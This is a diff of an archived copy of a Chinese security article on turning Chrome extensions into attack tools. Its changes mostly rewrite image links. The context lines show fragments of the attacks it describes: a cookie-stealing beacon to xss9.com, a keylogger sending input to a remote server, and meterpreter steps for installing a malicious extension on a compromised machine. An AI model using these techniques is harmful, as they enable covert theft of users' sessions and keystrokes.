@@ -3,7 +3,7 @@
 			<head>
 			     <title>Hack With Chrome Extension - Evi1cg</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/14410">http://drops.wooyun.org/tips/14410</a></h1>
 				
@@ -26,7 +26,7 @@
 
 <p>在知道怎么写插件之前，我们首先了解一下插件的文件结构，随便下载一个谷歌插件,将其重命名为zip后缀之后进行解压，解压后的文件目录如下：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510522856171110.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016040510522856171110.png" alt="Alt text"></p>
 
 <p>其中，manifest.json是主文件，来声明要写的插件的相关信息。可以把mainfest.json理解成插件的入口，即chrome需要通过manifest.json来理解你的插件要引用哪些文件 、 需要哪些权限 、 插件图标 等信息。而其他文件，就是能实现此插件功能的脚本文件以及插件图标等。</p>
 
@@ -80,15 +80,15 @@
 
 <p>创建以下文件：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510523543228210.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016040510523543228210.png" alt="Alt text"></p>
 
 <p>现在，所有的文件就全了，但是还没什么功能，尝试加载一下插件，浏览器URL栏输入 <code>chrome://extensions/</code> 选择加载已解压的扩展程序，之后选择文件所在的文件夹。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510524340432310.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016040510524340432310.png" alt="Alt text"></p>
 
 <p>然后插件就已经被加载上了：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510524866759410.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016040510524866759410.png" alt="Alt text"></p>
 
 <h1>0x02 How to Hack</h1>
 
@@ -113,7 +113,7 @@ if(''==1){keep=new Image();keep.src='http://xss9.com/index.php?do=keepsession&am
 
 <p>保存文件，重新加载插件，访问任意网站，获取访问网站的cookie信息，如下图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051052556736554.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201604051052556736554.png" alt="Alt text"></p>
 
 <h3>2、Keyloger</h3>
 
@@ -157,7 +157,7 @@ fclose($log);
 
 <p>加载插件以后，键盘记录启动，当用户在网页中进行键盘输入时，输入数据会发送到远程服务器。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051053018531164.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201604051053018531164.png" alt="Alt text"></p>
 
 <h3>3、ForceDownload</h3>
 
@@ -209,7 +209,7 @@ $(document).ready(function()
     });
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051053051371274.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201604051053051371274.png" alt="Alt text"></p>
 
 <blockquote>
   <p>修改payload可针对性获取某网站账号密码信息。</p>
@@ -225,7 +225,7 @@ $(document).ready(function()
 
 <p>除此之外，我发现chrome是可以通过命令行来安装插件的，来设想一个场景，我们使用某个漏洞，或者社会工程学获取了小明的计算机控制权，现在已经有了一个meterpreter会话如下：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051053136676783.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201604051053136676783.png" alt="Alt text"></p>
 
 <p>执行如下命令：</p>
 
@@ -233,21 +233,21 @@ $(document).ready(function()
 meterpreter &gt; run post/windows/gather/enum_chrome
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051053225760693.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201604051053225760693.png" alt="Alt text"></p>
 
 <p>可以看到目标系统是安装了chrome浏览器的。</p>
 
 <p>上传插件目录demo到<code>e:\demo\</code> 目录，由于meterpreter的upload只能上传文件，不能上传文件夹，所以这里需要把demo文件夹打包压缩以后再上传，之后再通过目标系统的解压软件或者自己上传的unrar.exe进行解压，具体操作如下图:</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510532797214103.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016040510532797214103.png" alt="Alt text"></p>
 
 <p>使用如下命令寻找安装的解压软件：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510533183690114.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016040510533183690114.png" alt="Alt text"></p>
 
 <p>之后使用如下命令进行解压并删除压缩包，具体操作如下图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510534428131132.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016040510534428131132.png" alt="Alt text"></p>
 
 <p>之后为chrome添加插件，使用如下命令：</p>
 
@@ -263,11 +263,11 @@ meterpreter &gt; run post/windows/gather/enum_chrome
 
 <p>缺点一，会有如下提示（过几秒会消失）。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510534428131132.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016040510534428131132.png" alt="Alt text"></p>
 
 <p>缺点二，有图标，有提示。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510534871491142.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016040510534871491142.png" alt="Alt text"></p>
 
 <p>一直在想办法解决以上问题，图标可以换成透明的或者常用的插件图片来解决，另外两个暂时还没解决，详细的chrome命令可以参考这里: <a href="http://peter.sh/experiments/chromium-command-line-switches/">chromium-command-line</a>，有小伙伴有了解决方案还请不吝赐教。当然也可以尝试写一个小程序来监控chrome，一旦chrome打开，则模拟点击事件点击取消按钮。</p>
 
@@ -277,7 +277,7 @@ meterpreter &gt; run post/windows/gather/enum_chrome
 
 <p>然后，我就控制小明的所有访问内容了，就像这个图一样：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051052556736554.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201604051052556736554.png" alt="Alt text"></p>
 
 <p>当然除了以上的利用方式，还可以通过发布一些插件让其含有攻击代码同样可以实现此功能。</p>
 
